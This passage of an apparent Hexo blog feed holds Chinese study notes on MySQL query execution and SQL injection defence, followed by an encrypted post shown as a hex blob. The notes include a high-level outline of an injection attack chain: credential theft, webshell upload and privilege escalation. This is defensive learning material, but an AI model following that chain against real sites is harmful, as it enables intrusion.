<p>相对于查询优化阶段，查询执行阶段不是那么复杂：MySQL只是简单的根据执行计划给出的指令逐步执行。在根据执行计划逐步执行的过程中，有大量的操作需要通过调用存储引擎实现的接口来完成，这些接口就是我们称为<code>handler API</code>的接口。实际上，MySQL在优化阶段就为每个表创建了一个handler实例，优化器根据这些实例的接口可以获取表的相关信息，包括表的所有列名、索引统计信息等。</p>
<h3 id="1-7-返回结果给客户端"><a href="#1-7-返回结果给客户端" class="headerlink" title="1.7 返回结果给客户端"></a>1.7 返回结果给客户端</h3><p>查询执行的最后一个阶段是将结果返回给客户端。即使查询不需要返回结果给客户端，MySQL 仍然会返回这个查询的一些信息，如查询影响到的行数。如果查询可以被缓存，那么 MySQL 在这个阶段，会将结果存放到查询缓存中。MySQL 将结果返回客户端是一个增量、逐步返回的过程。例如，在关联表操作时，一旦服务器处理完最后一个关联表，开始生成第一条结果时，MySQL就可以开始向客户端逐步返回结果集了。这样处理有两个好处：服务器无需存储太多的结果，也就不会因为要返回太多的结果而消耗太多的内存。另外，这样的处理也让 MySQL 客户端第一时间获得返回的结果。结果集中的每一行都会以一个满足 MySQL 客户端&#x2F;服务器通信协议的封包发送，再通过 TCP 协议进行传输，在 TCP 传输过程中，可能对 MySQL 的封包进行缓存然后批量传输。</p>
<h2 id="2-预编译防御SQL注入"><a href="#2-预编译防御SQL注入" class="headerlink" title="2 预编译防御SQL注入"></a>2 预编译防御SQL注入</h2><p><img data-src="https://i.loli.net/2020/12/31/qe2tadnFjOmxPEK.png" alt="Snip20201231_13.png"></p>
<p>学习总结SQL注入的防范原理</p>
<ol>
<li><p>一般的注入分类：数字型、字符型、GET注入、POST注入、Cookie注入、HTTP头部注入、基于布尔的注入、基于时间的注入、基于报错的注入、联合查询注入、堆查询注入、宽字节注入。</p>
<p>我总结将其分类两个大类：回显注入（注入过程中前端能看到回显内容）、盲注（注入过程中前端不能看到回显内容），而把其他分类归结为使用的注入方法。</p>
</li>
<li><p>典型的攻击流程如下：</p>
<ol>
<li>判断 Web 系统使用的脚本语言，发现注人点，并确定是否存在 SQL 注人漏洞。</li>
<li>判断 Web 系统的数据库类型。</li>
<li>判断数据库中表及相应字段的结构。</li>
<li>构造注入语句，得到表及相应字段的结构表中数据内容。</li>
<li>查找网站后台管理员，用得到的管理员账号和密码登录。</li>
<li>结合其他漏洞，上传Webshell并持续连接（留后门）。</li>
<li>进一步提权，得到服务器的系统权限。</li>
</ol>
</li>
<li><p>防御方法：</p>
<ul>
<li>早期的常规方法和现在一些中小型企业的网站使用的防范方式是在服务器做SQL代码过滤、安全编码、字符转义、字符替换、参数类型限制、参数长度限制、使用正则表达式等，往往达不到预期的防范效果。</li>
<li>目前相对成熟的防范方法是在代码层使用开发框架、数据库预编译之后参数化查询、使用存储过程、URL重写，在网络架构上使用WAF和防火墙等设备。还有一些目前研究先进的防御方法，如基于改进的模式匹配算法、污点分析算法、机器学习、抽象语法树的SQL防范技术等。</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>MYSQL注入</category>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>知识笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>博客主题更新</title>
    <url>/post/updatetheme/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="235a0fe11db42a1d83a1edd58c70eec0b6479aa9bacf56e76c1e035919d27388">f2cb6dad3997b265c98f36a97452129c60a991c5060bda72a30623d42e3b4e8d57627295faff0623339b403669bd452ca9fc1aed765bf34b8abc7864dd55f2e419a409c13bf4b3acafd700e43bb17462e42f17f25443d037e688a0bbdc15518054ce9e42828c60e030439e6183a7e1605b63207a0a559cc612025ec334450df53f01ebbf18ca5bcf35746f5837730c6d1034ab96fb9e4c1d40c158deb1bc55d544e16794282d3f9031f73452a9cf1c77c0af6b6d2ddd04bca42b36f61af60e97ab9a42937877239c314721f6eba6aee799775fa355ffdd5246e810cf78c4b2e19f57055edb4d4be3150e3033bbbe335a2027d9f0e687627f187d8c3c7ad49bf7dca22f37141eeab69e67c1dff28e223be02fc6a8c1697236a89bde31ff5a66430c369d7cd9b29922c51abb0914f9a02de5812c6675dc1271b1c36dfd41ebc359083d9eca5726e00bda6f186bd13c05ca357c07d2274e32a22e62067b5c6b7980d88f7b27dadbcad1d78abdde372b0636082619ae2c2df70b9c55a90906bf3bc1b93d50cc99c0e8ea0e742e002b95d2d664065f039dbf14a2dab00861843f9ca52917cce84f418a730fa875f5fcf17adaa452c7e329c3157a8a544ac39f7be5e5bec3d643c182a2d8078f02520b4dd36e747112a8de4675746b47c850c0708339178db424b070bc57d21e64a87d303607ad6bf4fe00982eca7dc1f9b63f033ea75d49240b3584f034846dcb36cef5ea1c37424b358b7db63e1a5a8a30f316929833b0d1636eaeff9a704de4d3a4e44b7d8a0a87ec743c2820eb35b823949276c0abe1c97cae4741e4ac55f5494b23e60400c67c5c44b53b9ea8184c09126e7db504b765c8285fa9933915fb2a9cecb8476c239dabd7e8dd08640fc568e21dac7efe7345527e9d62dea68b025bb0befa1b34929394511fc7b2a73dced3d00ade8c0ab1dcb1524b2c92ee9850cdd8352fef532da93231b1f19bf141607f3db928b26e27d0900bcab7e9a58498f4fcfee5627a89ccb8f93fd48ad9ffc23722e8d407d1bc36e48e1cc58b06c5885c20f15495db92ce63986113d32ee6fe4c97e10535605a86dbca206c87e36c54587d5cce63c00f305d517b64ed3cc86987cb767fdb59a88d4354d290157ca9d500f3ee7f85e95e72e56d7213ebd2e542f688c751ac85e3314c4b342b00acc276095201a3d2068d80a0c496810bf879f16a5d92eb378dfc583436306a2fa3b530fcb1156669ca18c98214ceb03686cc7f319729f292e94035166a03dc1c01ae63645411c5e4467b60c1e123a3a10a5115258a564be7620c259dd7e439a239109b9fdb2224c8f9d7c5a2a9201e5020e2195cfb8510ffc8de010454402b0c242914e1c4207ce603270249ac830f3f99b182270388d06c482edd57325ecdbe9faae39881d11970a2d067462ce64fcbff11bc4beb0c8e236e48d32cedd7aaa008e4ce0f84445561b8cc477731603550b83a777d52e91aa381cf8a224db0850199e0c953bf2d0c7f814c0e2ad3691da77bcb3333ab02d433d3f39a1f4c11ee72e2118cc785bb4afcffdd4b3148ec3e7395068d72b9d21e816443271d7b71f278423b2ffc1752d6407d31c4df1e009d71ce51adcb4cdd14f09379f2a00a3eea4c14d5f1fa0ab8d64b6e55f8b2f8aed4e40f98fbd7f1bc528b0752841979932ae09d4b465c14049b95874bec4af885227a00b374219d3100860ce3e1dd30bb7d4d3e3d5961867ecb3d5b6a2e1b1608eddeaf9dca395f74ce77644637f4f6ba4947ba3f0b4fbd408d7d837377131a03d0fab9fa3425dc25c4c201819468cef673b7057db24dbca66ee8bdd5f2a15fbe56d1360ba2bb9e0f5962f6399806f4b873fbb05753f64ecab56942656bf3f6e66a4988a75bbe9e0594a73f5ca91543a167b48561da664de3d07312216f9c0111fd89f6bdbbf694f05ce8fc7cd811e09f352bc330be2e8da76a4b4053ac966da6096d60b7c2309ddf95f6989206d7f13a71ef10aa450b7daa5aaa0aa992e47f4aff60839b0042d796d225b24e631ea2ecdb646a3ed96c52763c1d7d2a633c8eb4558e28d03aba4bac6d55f2fba970473988269bf2fea959866fc44dd3d2c9b172f74ced5b4e6d370f25b82946a68b5f40142ceb20e4bcc8e40b8746ccb878fb1271a453cdebdc18946b595103cc2fddd92981a22b6d2fa325253366a565a7ce4bcbf022f2f8c0bdb8e2f306842062ca90f91af1cc39248a9b09cc43c1b9d893103ac0c47ad7794d5c4f1a69d18280680a0b7619d9922b15e0794310748c1a6b945d4dd6058edd92dbce5c418ae0ada27c1247f3a90b9d1bcadc7da380d86990e072d0106e9f424ecab6c6b86988560cd01c0f8744781f9ed32a80f601e963cd73126474b161274ed8ac3389be38d81d740fccdef9e99c2832755d15060c33ffaacd1329fd1e28a6be6024b5d5fe7ecc7a1b19543f1e54062d80dd8696ab4c32552398db9a9be441948ba0afac7b2c3f1ded75a239c006b517ab2811a507aa047c172be164d4def38f3dc87e18fb4c21c7966df0ca0a6b2635562e7f7f82453eb056f4e8f54643aaa31c8bca6163a9a8d06b39dd97e00d706547bcaeb10e55458d8fe4e4bbf45bfc5260ce7af90c65a7c9f3ecd846eaf3706778bf09f950709aae7813118b8db905f920fd9b04f23aad85b0999197a35aa08b0ddbf18c3f35ebf4a04e20af933f28409fc3f61ade1c242f0fe6265b543f37c0ad245df56ec62f399c39c3fec8ce6a7240316e7407957b7504f4e259944dabc1de7b75ea0f251a0a8a704fb1d0a15d07b8b56dddec40037ea7f03514dfba5d0c98634b3c4630a4afaee3c9ab9993e9b768282c10811a84ba0e3b10e461c4c773aebbd2459f5ba993d61fa55072157c1e7f54a3c8680e2d3c2fe54f3327ea1ba746eafa6ce2cfcd3629f107402052a30d3729e722b833d1f8fab354241d6a8fe6ce82809c741a8ae5fa6159c4e4f4c24cba19008e29dd8c60e06b75a918ebd894479eb24e64e32bdf0cbebe0ea49492a17ead03674139445b1231cd5406ab5a1c0a861830e1074bc6d1918633e87a6e3c19243571c0f7979bbacb96e77d5f17468fc46447c8632c7371861342ff7f94bee24fbd8acbb54f2ed8d67d19a6d2e7e3ebacc924455cdf51a9515dc441a166cb1d33e8eed837f7c45753a61f4b37e8365f660b03d915a8ff79a0a1b437f3f56d5d17385b59389abc782b0e67068aa3cefe71982ddcf6b81c26c6ec016a986b335c621c48d0e59593c93740ee0f1b55a68ebc031c70a1667d82bd2b890902617ae4dfe68a615202b76da4b31ea1bff49003d6e5d509f62b2b3c4576e2f943fdec7bbada5d5c3fc410d60fb30f45517b80c8146ef15bedb22f05df3f831d88db8d778cd23bfd6f8af3973f146e7fc37e224d3b8a3ebf2d09a13b36318d8a9667f518252bc3d311a3397a23f86b7087363a5770ff320c497851515e8edd891b1fce70d75b6bf57e505585e45b38ba0e532b70db9f47cb406cea4fb5417069a777e845b57c1d376b1be5d905874c3f4013baabee429824ba9c2e8405909a4d00137fc3adea621fbe5e5955d77bd2638f2f91004fefae0c8eb5f88e41de49084ba04a92c7b045ff6861f24f66c2c779ef853d357331cf1ff50c4ffa632eb03a3722f8a375daefbbf41bc373b4fe5b50a63b7bde9a52c8b541b4c7b6738958e13b766939b2f6fc43d8d1c6a5d220f99197ceb68e4cd86396955fe4f843b222223b257f19193123cd7b57ed336465a92604206d8ae8d482e7d8585eda6af420e5a8f56f2ce06778230caa820d2306631b7d19e717d17e323d0e0e3e0552ee949e572044ce547a8823ac89d18a02a4767e26d092babad12bc7fab31e8be4a3f356fe763a5c6b8523ca3f48ef9d4f888ba787b2cf388385c2cb08e1a67c23dae39c875dfabefa427f0911c7af88ac04636b2effe1d7de873285ad39ff14d2f6623d51eb1a85ddc36be39dc25e1cf6366c6fb2874417e41ec810ea5d2de6e58b05d724895981f2050f0318c5e22d6377ffa0aea12eb2106d97f011de63c2810e1c8af8629b2ec32e21a49ed36649f2b210c2dffa48f2ff42e89dc33ec06ec2cae12efd0483f22ac9ded63f790aa36bfb749a7bcb788d1ac85c4f8313ee72e10c503538277f0d530362212edbf56530e5e945558fe8a1e85290a91f85c4d3ca60e34cc898770a58f8a5a02e9bddcc5a992915d7faa8cc03f5fc1632dda78f44ef2974ceff5f658370117944429848954f4b5316221452429d96f5d89d5ac44d3ca74ddba24ee22dcfd34daee2992bea277ae988db88d7785fdd993204bc7105e6d1e1912d281cb7ddcef0615448bb568ee1f282684fb89b870a3b614c365a27020523caffb172fe71b608069863c698ff5068d193116215d6892f9790a618cdfb17e96ab5f379b3806d87becf62a9f76adf56a4fe0d76a3ead7302fb720470cc938661dcaf7bf217b71fbfeb172a1290425072aa39afc6a5478ce98e097668a24de16e61e5021d0880e6155b10d92e226f522add2c99fbebe2edad5ef5b22b80804ab5a1181847d5d055e2398217af410d1e6e04a2c6e59814b4babf44a6442745fb5df58fece6f46602ee2da2c4f2d042c48b60dc21de50d7dd03943fffd101630e88fc7102bf51f4574d31b688e9b130c737e47a7aacfb51e9bb002d117601bd77b492a2fe744b2ad462dd151780a27bb54fea1794bbcd779d9045ba419add40d10d915644419480e417f8f58a06d04215f34d0a00b46bba3f063317787b2d11db6bb7ba662f7939298e58661b67d8152a47f8816ad1aeeb8eefbbcc5cc7fa8989d4308b18da78cdb3fab88202c9e66a5932c682e15267e0ce68b4f5421fba014564d53109aa8639e40b2a46bbcf65d58358243922cb9cdee1887c52c4acb1f978a84973f1da9fd7bcfc83e3a209333fc193ffe499e7a19d9d2a721681b772ca042cffc471296302438b905cefbbc19d0b27f9627e0d21a50899973201a51a2ca7193d63cf72022eabb02a9ad576545f34b0942cd2912d67cdca35a4faf98a19332b077464ba3d0ca1c1a9c64a18a399f5dff5c4e30e76688b00e98db24aa2b6e8de9760dc7a6a577967c08b57b2805fd7ce83d08f4e7ee775461ec23f4d0c8659e739d50d2613354ecf2cdd5ec182473693a096f19873154e46c62469a213b7337b2e3d6c533d015d31dd45b5045ab302938913d00f1fef5d6b43d852220d30a4efcae23b7d152fd5913e9a566c53f134ba31791cfcc0c162523c7bb797eb03e21f8cd6bb65ffd83c57c7b628a8f2ccc770bfc8349ce5d5b62076d8ebe22df17cd12ccbacf683b3d1aeb4371b6b1cdaf1e2d2f328c27f8cd698e6f6ee0282fa726cf86aa962a3f7e8453c0848be3d25e091c7dfa18123c5eb7e2c0f01006db77314f9c83e2b533d185b880a5d55a671ac9dcbc170734c33eb7a4742227a2fac6dc7817e1d9e026b581357316ab88dcfa78d6b2c664ea963f9004db429452adad96d059f6a544cf46a156c548c4d42f1f69b7263891e2bdf370bf9086d4ec6591fcd8f2e74e0f1de271dfea8526b5130f8ceb76a125d9bb96037e39fe5ab559d2329802f145570c3964ae5506af0c721a0ab8c70f8d80fc98140b1c7bfe97b1b57b9954b992c9de8d634c4f10acc744d073bf2c6cbf58264bf54bb88c26f0775bb7bda89a59a7752e7dddebc145de495a27c479fab429729f69142ae3284b241812b8572326cd89f763201b17e406b58189c7ed6352302eebf5d8da48a6e02f2a35acfeca57675433793fdf80ea5f35fff80550942dc7760fc6f1f912a43d8c62c7651eafe85c829033e5f02e872b7b1d35c2119c9c102081382d59d6ef5b72ededcaf8fb36ab85b5d0bfb92b846b960f5b2ffa8a018e986f98455959e0c095376f105a5d0a062585e757c2ce870655959918988816f783434108b22f4072fed5244ccf26ca713424539f67f504ec65a534181d2d2127e3267cac8eb76d556c947afe4881070bb2c7e4830ac87baf6e5859ca79d6c465caae04f8ccc8423cd99e8726446ef18910eb385a220fe898489d718364b7beed5227d7d3305661147d1298707e592cc3e2242bab753620e3c2665c2e5e802efc91932c8fa9a9e4c670b4eded85dae71f716b968eeddb985654caee2baa030ce619adf9ddf2d8eda8e25c3aa2fea09ea8f058b92ac17c1d3d19c6a2d89dad593a63c15604eabde2cc94a19f46db6b9f6a90bfe07374b3f618977b7a7f247a3b4bf34637202cd08f068fea8549e038198e4b6144e593e5fe15bd31809acfd2813e9f6d5e31799b87f451b879577d1c032034c51aaf00f0b5bdc158305de9565a754432401b2c51f8bdbfdba3002a5171b0212d4a835b4266aaf929a78fe40a66b28d1169596c3e95b1ae32b6e889efcf6c1be8fdeb38dcd817653eddf5940ce36b15b59033b6ebb294145eb580c9b3b83eb6fa97a46853d3b54fa39f8d80817628854c857ac81f4e9bfa0a43678c839afa3e9f37061fc5241c2bd2cbe7fd8c32e1772a8633d0120bb938c3266add1dd5ea30bf5bd1f79bb797218841582e210abbe78572d42cbf344fc9adecc9dd98a20800fb20404cb7c6ebc921cda27347914c2eba5a82353d0a89840db8cdbd4957b2fdd72a522b6f51e200f1fe89abad907d66228652772e4e5a2d900b400ba1afe0857dc1168f90d03c450f39a6ef71d99741e6e681d4b32f9d7de6c36ab7c842cbad8da9a40102c23c4b1cbc0f21a72a73beee07a9f9ba2368cd8f226ae1ec17ce7cbd26a79730a9f0104e0df9c258cdf80e756149a93bc39cac48b3a15a9e8daae7ffc9c0c41a16368e726ee1217c04c025d57de9290ede2ca6d6e9b01064bcc8c2cf790293417c343e49de525901f28b376325f5d425f2227f21cce0b6ec1559efd8be12819aa92cb0803172f84aeb20d582dcdd4d540759498fcbf738a4dc8bc6379a7be1afb26b2d5da5cedc519b013755438cb96829bb5b14a0611c2eaa044d757944bdcca606713c2750210dc37484b2dae181a977df41925d8d9757114bb800d7b4966f3d5360314cd52648fa406d4420536a060bb5ed1d100ffe8845d092f968c7a8f8929d1eb8e3f38ce6cf6696ca26d5df1fa5f9922c92e43b03c9a71191161c6dff7822162228b0e654b18a1bba146e1dadf643f96e3c3660bd8636a62b18d479106d455cbed340b981612a46ca91121e5e56d93e09b113099b44d93448a01ed945ae59faa03e2f2b5ca551ff4250fbc9b40f04a59b4647d1f25586221f478cc3e861922293f7816c0889a3b94e6d0c9e63c7d0cca9d92d28a23a1467106f5b852d0f070839c21ff825c49433a3b276d7f36840564c96ed2f4b1138e1630fe827b95a3d9579eb6d32a2bcda26b4b2ec9b7690c0ed730dc6391847bf8dabb1122eecd54e2f0754d782fe71670e40658d3828e45d7acd11ab7d85b99442c4ac487edd72b9fdc95d175804fc0d84160221987eb1d4d63eeb95a3a7f62e47082cc1df76f36df4cd3ba659d5f4fb8e72686d4d6db4375ed425e5c1630358a5cda78d81220553c2eb53a58e5d33158fd1eebd93933bc41cab86d2dde54dfb2325b9df354f66bf383cdea69f3f87fd211677b1ce7dd4ff229f8bb4ca05403ad4715987b46ed56090ff9e7938c45d5ed21881d690e7dfdf0e87b436fa29891e19b0ce27ff98594102693f19303224773e4554545a227a309380c2c4ef0eda788d04ea6bc57965e155386eea3f51d4fae2a781427178636b165d9f0621b785a0ac6cc6eb6243b1ac51b9ceef656ddc8560cc0b2cd870c6989536234a639a481388a0784461af61bb68897159cb6d1e9762ed9f6f7e35d0a32c0cf50d48d641b921f23756c47ade1858badb061716baf6e7156cb80c488d7a0fec26dfd40299e3aa88d12130f03385396d36b8de0fa412b21c09bb55e62007ca14fba1c4af65f0b9049a4b3be6ab1bc18e56d24e1c4300c37904064a70b6c858dca2261734aaa403e85aed8dabb0603a84085cb1392d18f08d42e427c09b964f5e8d4cb9f87319d66ce38b2c8bd8e1beca21fab4b660f09cd7496067c8b5cb6fa81e45b8e21a66b8277a3c11353017bb6559417a6fc3c4b778fca7b07d0bfc64ce93c42d6c7da71ec2888d63ec1cf052e913bc53af6bff19f127d4b6d2e6da243e1769d4a4ed709632a01a5de5278fdcdd906ef56522428c69a6b91bf902940ba9d9f9490386ee906b347bbc4859b0e9c6cb9383eadfcfe7505c64e4f75fa5e49bdd3193c26e3ab2495d37ddf43493bbc08e14d4ef959a7000887a1c3ae8f3fe42aeeff01691454b405cf94e61df726e7cd3fc23ea492a0669e21f430ed477bb191116fb450d4d142f421a5b91fa37ee972b44249cb5c1fbaea928d04b605fd068ecb8cf910712339c08bba528bbec4733d0824cd40bff7511e4d38670248131094822c3bc7b83a924ec53f2f44361453ebc13cc082ee64e506b5ea45652e72ee2bc78343315a022cf7fb904d7c261c7c042ad52a6b1f2331ca337d906fe015461bfb7222f71074356d55a86e776c251427e449c7101d3c0a3405b76ae36d1917d82f102c42cf3badfd4d472d418857077a358065e6b38e225f3746e4e5ae6e4d92987ee54e93fd290e35b90990eacb3d245195be2e49b68a6f1477cfeb9e7df9be139b16cd012584cd594c9c33c7fe2b9a3a4437294a906b283e3e07e6d655e9d3e80698f17be614b0f0a7b0582e7e81176dde731e76bd76f00a20b3ef027bbb99bee88a1c03622a3888e727f49ab6ae300fa22869bc6684510bba97c4bafdddbdb65ae8f3af95e2744ef75e981e912fcf055727a7c1ede078bd5327886adadb45a97f2c4d25159a5eb93005bfe3209723db56f30825287304b12bf30f45d50f4f772ff3375c04a334692ebb122b17111da89deb74d13979d1bf3604f52ddff18a937d57116371c5fbd12c1a082cc8786f5f7ce7be1f4024c82b5a4507bd4ab5a5c5f388ce578c0f48c4bd5f22080da642f4fa2cf42f1d68122f641a34436e38f9ffe114264c2c2f566a90a7e71afde965a6ed99f924d66411b3fc12ed5e0efa03e37200e4d389bf283966667456bfeef38b5671f62f17aa7c706711c37f620fb3e608c9c9f4c00236d992a83ec535ba0fd5ea7f260b8a3374c19dad72e88de64ce724ef971c5802df807038e72bffdf9d2290003fcbe64a832b3e7acb3d1b9abb80be65679f19574853f9898c0be29f265bd7420387dfa15c0b8d1935d5c53c7ae1fdddba1cb0542faa2ed532d06796db2edfd72bdc8fed6b166ba43690e7152653fe5b742f6dfaf35a8890f217245c3ee5b0fc938b0dd879f95728ad731f5f3913b8312aa74d40dfad0f0124e70b0713dd00e25123d7720e714725871cc3b2d2910f58194d022a4ba20bcb5298d7409053cb9294ab1a0032af847a4576e7715f9fbeb21a8c286f8831951ace2afc7583cb54f0d02588d9849ea371cf65f2bcc852d70202cc6306b8f5e3f04c02758266df1ba39fb6d93464ae3d732501ce5ee2dc3ad253485d91982244c3b64b3aa4db9daa3dfd44a2a9771e91cfce2929209b45f02f8a65282bce528babd364a44bc706781bd6b1bf82c2b72b20b746c762bc5b51ad934d4c1cfc55cc1c80fdcf9f7c8344731be94216a889943764b52078419f152d28985011d31cc4e00c0fc55a06a84f38f1e4a6c5d0f289a167352703bb69cbbd29eec8b7bea96e6ec5456a4f5ef0e5576a8f7252e9ad6706af3aef2dcd392b56eb43fea066c3ef318c64c980cb9ac3d18f55370f2ffcc6986561e797b7d3e28d9723592ee6663cdbbde627fe958731a0f8ca56ce16d3c02f9680d3837521e152273e28e186c42e39ea8878159140876b6adb03ae78757925d8ec9cce36d6852a2b349d2842768252413d33c67ba8fe74779fbc8f5ee4f939d70583a01c2d09c1af0465abae8b354ebc98c29f73cc080c4f4201fa0c43bcf56302484a9eae69798ca05591089eafc6e478d5c287c52fb8888fd425e0b7a759d846940cc2086b0de2bd2d34c974f05f2164345619b0e8cdf25d823392cebd18cbd00d95850640e0ad75ba2fedab956669f349bb6d3ab76ab5d046128924b111f571f336cc1f0eea0b6b171c8e90b9a64f43bf16a618a28336846eb0f153ef8261485956919b2e8a1d0821d8e98993e6323646f534d18be0ef3ce94b90bc99bd54cf9f22dbfb208ac268d252778b46bcda567e1c6c5049dab52c534b41b95527730bf40e026610a386561634e8012ba50863329ff1dffd8c1b28978765ab83fef1cbec4caa4e627bbc19253741da6ca6ac10ed38fff650a76645a349e9a392302f1d6ef84e946cec58c65daad5f86fe2f530d7e61d2815db7305e126930723a7efe19aadfa23c51d14d75685183708ce28d54f405e3c0c145bb03a02392e629996d80faf4adb4e6c6e0045003e65e1ed3c3eafa1a741a5767e761b995b03efe692ac25e89a892c2b5172d5dd22e0961a8496317609c8ad857634b7659afdbb947fc0a1fdd9bdd53eab51da418deb347e0e1e3878ca341a3f400786baafefb7925a61495d4bd17800fe99f458808138985bd4226fad9a5c7fe196d7eaab004080bfa9e9576af0cfe286501cc9d42613ba8f9719ae48de260edc750de3205243e7791a0fa5c3d73f57423d4e25f0bf0936d768e2ebf33e0a0c6d48ec579cbb7242bede06eabddc0c54ca72e449bba1cb7bae2c45aa828a1da827d70ae67562f9c9e700f1db34f29403aad12178e8ba7e2f452967f00f7c7b75ad2ac732057c55b5d8c3ae956b2712607aa97aab1692c4f1cc162588c871ba45a70d20796638bfc3b0f03030e673b164bb66ce4dc883d8a8bc3fb210387b1c637c642183b0759dfac6e9ab13dcd9b849a933468244b8a38db07a69ff57740d5d818bfda425226183fdae2e751b60b9b4ee60051c815dbd1732533aec30120709d4eb72337501201c2435064f3cc372c2ce05f720ad5a6c340c882d3bd6662dd20cef4b4ebdae0afb2821a94a07c3b3d373b05f650b82683eeeba41a7408d95f1433aec33224da5717f515a1cbaaa0157d133cddf48623befbcbad22a1a3085d56c642863b9078765304b9830569ca35ec4541abc42ce5c0325b56abc68366c41d22ab8b6742fccabafae28d04ce5f1de7f14a8034f3773a5b821b1a8958a9677f5c4cc1a593f3879cf71ea8dc143aee4a5d366587f100dd1b3601e6b34944d926ce00f55b5e11ec1aef40c9daf08c9b1f64e8e86658b3bc0c7f42ab0812e7a45f23b3f32f2410c17f32e912f51ac5f2a199c68e8bd9157096a691e28129a100c2b40f229a4fa6604d4f8fb4a00d99856d119819500c24d82d0b6b868dae3117d42a7638e4c0965b2aa444737edd6de8660222dc49b9da9aa6587f5e3f6965db0018ba181c6530b45c292a4bcc034e141b67580fc429a1ae95397138575bc1722eb860f79c81d3c6ac52f838d38fc8d4ed5a5de8108a4fa22ab8cdb2d74fca06896622bc41623ccf57069a903f8ec4de3af0128887725ecd7c639a3fde0ae1bd4c8f77ef149c16707bcc7b59bb0a639aae90318e640861f1c6803476908b4256afa5e7bdc842cb6cc5fe83f6d18ca36343b123b19e9aa9118f56bbe20406305b3d8b0d87c4f1ea144efac11e742201214b2299db9e696b58a574daead4544fcb29666f5982e995f6db7af3fa5d1262124f98b8a75ea79d4f030044ebf0deff03c30584115b2e42c552ad8ba9e04f59492ebaf33bb27ae21c4376a2fe3d7645c6f88d1981ae13d0547b3f7cc69878b2974a4656892de62f43d31aeb39adda5b86e0700a84ba94c41fd96db57432ed88fc5b414dbb45a785ff5f7ad3338d6f2fe23902971bcaaf49e6259dec7f4ea6db88648a889f5bc638a14a3ab73500113e0f1c221251ab1f6998b590ffef9ddd130efb5a2b3706230d0c4199827a68bad60e6404597c8d4664633d0c0d67b73eb194d57f8f2a435cd63d1b2a151149246c28e87667ef16dc01d29506bb27b45ac69ce4f4f9ee96ac7ec141610a0711817d3d4a7881a9c182744c7f57af0105b600964fe7f0474a740b1b19f83ee3a8b0095e96b4cfc5b90727a452f6eca89a281fa63b47a29328b477cb5af333a6664d88070d56df451159008d425fe6cd7d24aee8233a4e14f5451483f7c49dad9b74e0e883c5f5e7e69250a8e23e59195f4d2a44edba4c0cdf64f8923f29887b0b284adbdfd44b4b49ab6d407a865eddb7fc77c81e4becf6c603e5b8a8d5433b978ebe5e1673d73c13d2a295d7d141e06dca32a1a3c4f2e59de1c17159cbfe74b119b9d95218e1ab2f6287909c7a096024702ceb7dd27a690c653c8626693e917496d0b71e2672be7df458204dea6f01f6c7dc6a1491fb786f49b34fdb34665b9f420180b766f04a2f5b0f0a23da7d9d1973a2348d23afacbdae6c23befb723ebf18143c22cae5372d06851b0b5b648751fe0e04572c9dcf95fc9e0c6bc58ba5adbcb5be68e5d8ef790aabc9d6d3d6e60dec4945e7dfda470213d1f2cef80623e195238c2ae66ad08c8d0ee128fb802422379276e9ca91333d03244fb542e085df9fe01ddb23efd783f59b95e6adeb94e81f0f1282028fcf05a0192d82868469491a11da71e5eb9ee7136079df63b2bf6d61b1ecfb9ee4b5cca423225aef8daa9119ef7847c1bc2e7e1974c3c7f8e895c1f2151fad4bddf65e8c437cf25d6d4008a3f38c31daf0c972f5065d865de8e24f1d390d701aa9424c85e0c54507c8edbf453d24ce376c6e1cdcbcbcf0dce366f23e018649c6fc1da9e1a69ad9004d69c0054c6cda58a8ed09af3c73e9cc61646945bb94ef0e039b5726bf27951b8bac645da305666b8c600728c07c0bbe10e9db9c34020b40a43b8927dfdda162b7ca2d8a07fe53efee1d45d45bd4710ec31611ca9cc2545bfb26358155843a333f351cd6a025a8f17751e49eae5f3dbacacf7f40db395db1109e8ac54e1b50bc49906f09439a4b0c5cb51e2884f49208e69fa5b6ebf2cdac162b78b8c62b15eb8e45dc3646d6dd5f71bd28272029bfb4b9f305ded932613380513cd4d6b0dc12e295bfd5dd370c995651646224d16b97a65a10d1fecc7ab56ebce0e6b2bf2ce2a577cfebe92082de580b9cad4cfd848e53bc29153e78b471895f91ff50f38f7759cd29ea0c8c2fb3f877688d7aea9bfdfacd81904d317c21870adef9ba134247fdd93235b2224afd060e99dc46f1723ed5fe3aa8a462120a45cb2a916b0c35564cb13189ad0cdf9d6d44b0823501bfc166451b1e6ed025b0a2802a1ae86ac1c63b1320c8c2adee1bc2bb69752a92c5556f6f726bd9972dffda6103c49a98c20e0f816aab78c8f2938b57ef203b041579762230430bae904b3d7bfb3c2cd6e4c7452f7e70cb89720a74fa7a25976595936d71c0323374b3d073ad13972b33bdd8adaeed82342c92d76ae712a23d0981cff7aa418e3d25b5d2245d35bfc225422a3eac31d6e101b84fddab2c70ad7073323b997c418ec779169bf3a6479e4de287b27bfb9c053c7ad763300591903a227d548585add58c368fcbc461d9895894018b190227a912c0586a2049aff57b4a7c21604822b33c24e8dac6e0b6b8d68610a35fc83f71f572bbed4a979c07988f3716679f13a50ba7d46c5705c1cf43f66b65c3ce827e43bc5001a38392a730c746799c2fe7c0f30ccbfe86c63dd905c942b21203b417ec303fb46ee09a2f0fb5ad59cdfc70ebeaa94dc3fdc9d44e5eb09fd208ec82e7e4e72b8743445af2ada63e3badc463ae876c9f31457c22e0789c3495b06673046e3476c14e9559f257572a4b94d61e49a751bbbcc0e4b3a3347e37b7f72f6ce17d4a7e0de701ace1867e6210d9db806c22474af0493abb9fa748a908c89134975440008c7fed4c13b74c715ec4821779c63f8d14396bfc48c6976120b0956120f6d9430234120264d45cca8807011dfa3f5c8b866a5e69205fbb6157947933f022520140b1a3691b121adf9bbd9336bf2ccc365120d9bc46b92a84022868b996e225ed0cf33a1bf7e3f3d0d1c5eb45a3039f1c9d8d633086e624b81f338ca937b52a8e60a3149cd90989f1e631f143fd7ac8fc73ee65f9c189f740e9758b58ab98ef3ba23e105b080d3477b7b99c9eb232dae938eebc3a3a05242a629eaf72f16936aafe5a95c8096c3c39deb7db5a238a065e82a59af7d4da99c28dc09f15aa6c55df7c36cb123f43e92a1ff4a937b8f38252871a0a5aaca7606438da4e621eea12ac0a8614532e65b2514c55b96af3f718c25c0ffebb3c0a7e4ee6cb6d8fe97c9c6b95131d5c562871e